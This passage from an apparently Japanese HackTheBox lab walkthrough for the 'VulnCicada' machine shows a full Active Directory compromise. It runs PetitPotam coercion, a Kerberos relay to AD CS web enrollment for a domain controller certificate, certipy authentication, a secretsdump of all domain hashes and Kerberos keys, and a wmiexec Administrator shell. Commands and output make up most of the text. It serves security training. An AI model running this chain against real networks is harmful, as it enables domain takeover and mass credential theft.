SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```
攻撃を行う

認証情報のリレー
- krbrelayx.pyを使うことで、DCからの認証をADCS Webサーバーに中継できる
- DomainControllerテンプレートを使って証明書を要求する
```sh
┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/VulnCicada/krbrelayx]
└─$ ./krbrelayx.py -t http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp --adcs --template DomainController -smb2support -v 'DC-JPQ225$'
/home/kali/Desktop/HTB/VulnCicada/krbrelayx/lib/clients/__init__.py:17: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import os, sys, pkg_resources
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.112.28
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] SMBD: Received connection from 10.129.112.28
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user DC-JPQ225$ since attack was already performed
[*] GOT CERTIFICATE! ID 89
[*] Writing PKCS#12 certificate to ./DC-JPQ225.pfx
[*] Certificate successfully written to file
```
証明書(DC-JPQ225.pfx)を取得できる

権限の取得
- 取得した証明書（dc-jpq225.pfx）を使って、DCのマシンアカウントとして認証してみる
- NTLMハッシュを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada/krbrelayx]
└─$ certipy-ad auth -pfx DC-JPQ225.pfx -dc-ip 10.129.112.28
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```
取得できた

チケットには、NTLMハッシュを取得した時に作られた`dc-jpq225.ccache`を使う
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada/krbrelayx]
└─$ impacket-secretsdump -k -no-pass 'cicada.vl/DC-JPQ225$@dc-jpq225.cicada.vl'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::
cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::
cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::
cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::
cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::
cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::
DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
krbtgt:aes256-cts-hmac-sha1-96:ed5b82d607535668e59aa8deb651be5abb9f1da0d31fa81fd24f9890ac84693d
krbtgt:aes128-cts-hmac-sha1-96:9b7825f024f21e22e198e4aed70ff8ea
krbtgt:des-cbc-md5:2a768a9e2c983e31
cicada.vl\Shirley.West:aes256-cts-hmac-sha1-96:3f3657fb6f0d441680e9c5e0c104ef4005fa5e79b01bbeed47031b04a913f353
cicada.vl\Shirley.West:aes128-cts-hmac-sha1-96:cd16a8664de29a4e8bd9e8b492f3eef9
cicada.vl\Shirley.West:des-cbc-md5:abbf341664bafe76
cicada.vl\Jordan.Francis:aes256-cts-hmac-sha1-96:ec8aaa2c9432ed3b0d2834e4e24dc243ec8d77ec3488101e79d1b2cc1c2ee6ea
cicada.vl\Jordan.Francis:aes128-cts-hmac-sha1-96:0b551142246edc108a92913e46852404
cicada.vl\Jordan.Francis:des-cbc-md5:a2e53d6ea44ab6e9
cicada.vl\Jane.Carter:aes256-cts-hmac-sha1-96:bb04095d1884439b825a5606dd43aadfd2a8fad1386b3728b9bad582efd5d4aa
cicada.vl\Jane.Carter:aes128-cts-hmac-sha1-96:8a27618e7036a49fb6e371f2e7af649e
cicada.vl\Jane.Carter:des-cbc-md5:340eda8962cbadce
cicada.vl\Joyce.Andrews:aes256-cts-hmac-sha1-96:7ca8317638d429301dfbb88af701fadffbc106d31f79a4de7e8d35afbc2d30c4
cicada.vl\Joyce.Andrews:aes128-cts-hmac-sha1-96:6ec2495dea28c09cf636dd8b080012fd
cicada.vl\Joyce.Andrews:des-cbc-md5:6bf2b6f21fcda258
cicada.vl\Daniel.Marshall:aes256-cts-hmac-sha1-96:fcccb590bac0a888898461247fbb3ee28d282671d8491e0b0b83ac688c2a29d6
cicada.vl\Daniel.Marshall:aes128-cts-hmac-sha1-96:80a3b053500586eefd07d32fc03e3849
cicada.vl\Daniel.Marshall:des-cbc-md5:e0fbdcb3c7e9f154
cicada.vl\Rosie.Powell:aes256-cts-hmac-sha1-96:54de41137f8d37d4a6beac1638134dfefa73979041cae3ffc150ebcae470fce5
cicada.vl\Rosie.Powell:aes128-cts-hmac-sha1-96:d01b3b63a2cde0d1c5e9e0e4a55529a4
cicada.vl\Rosie.Powell:des-cbc-md5:6e70b9a41a677a94
cicada.vl\Megan.Simpson:aes256-cts-hmac-sha1-96:cdb94aaf5b15465371cbe42913d652fa7e2a2e43afc8dd8a17fee1d3f142da3b
cicada.vl\Megan.Simpson:aes128-cts-hmac-sha1-96:8fd3f86397ee83ed140a52bdfa321df0
cicada.vl\Megan.Simpson:des-cbc-md5:587032806b5d19b6
cicada.vl\Katie.Ward:aes256-cts-hmac-sha1-96:829effafe88a0a5e17c4ccf1840f277327309b2902aeccc36625ac51b8e936bc
cicada.vl\Katie.Ward:aes128-cts-hmac-sha1-96:585264bc071354147db5b677be13506b
cicada.vl\Katie.Ward:des-cbc-md5:01801aa2e5755898
cicada.vl\Richard.Gibbons:aes256-cts-hmac-sha1-96:3c3beb85ec35003399e37ae578b90ae7a65b4ec7305e0ac012dbeaaa41bcbe22
cicada.vl\Richard.Gibbons:aes128-cts-hmac-sha1-96:646557f4143182bda5618f95429f3a49
cicada.vl\Richard.Gibbons:des-cbc-md5:834a675bd058efd0
cicada.vl\Debra.Wright:aes256-cts-hmac-sha1-96:26409e8cc8f3240501db7319bd8d8a2077d6b955a8f673b9ccf7d9086d3aec62
cicada.vl\Debra.Wright:aes128-cts-hmac-sha1-96:6a289ddd9a1a2196b671b4bbff975629
cicada.vl\Debra.Wright:des-cbc-md5:f25eb6a4265413cb
DC-JPQ225$:aes256-cts-hmac-sha1-96:01e2f9943c6c0c3f010dde6dddcae89cc81158e4f1c017e6fc34f85538d892b1
DC-JPQ225$:aes128-cts-hmac-sha1-96:87efc91730d07d819f58b4996e3fa04c
DC-JPQ225$:des-cbc-md5:6df208855d40dfcb
[*] Cleaning up...
```
Administratorのハッシュを取得できた！！！

Administratorのチケットを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada/krbrelayx]
└─$ impacket-getTGT cicada.vl/administrator -hashes aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
```
Administratorのチケットを取得できた！！

なので、シェルを立てる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada/krbrelayx]
└─$ impacket-wmiexec -k -no-pass 'cicada.vl/administrator@dc-jpq225.cicada.vl'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
cicada\administrator

```
管理者権限でシェルが取れた

root.txtの取得
```sh
C:\>type Users\Administrator\Desktop\root.txt
```

user.txtの取得
```sh
C:\Users\Administrator\Desktop>type user.txt
```
終わり！

![](https://i.imgur.com/8TXC4pP.png)
https://labs.hackthebox.com/achievement/machine/620650/677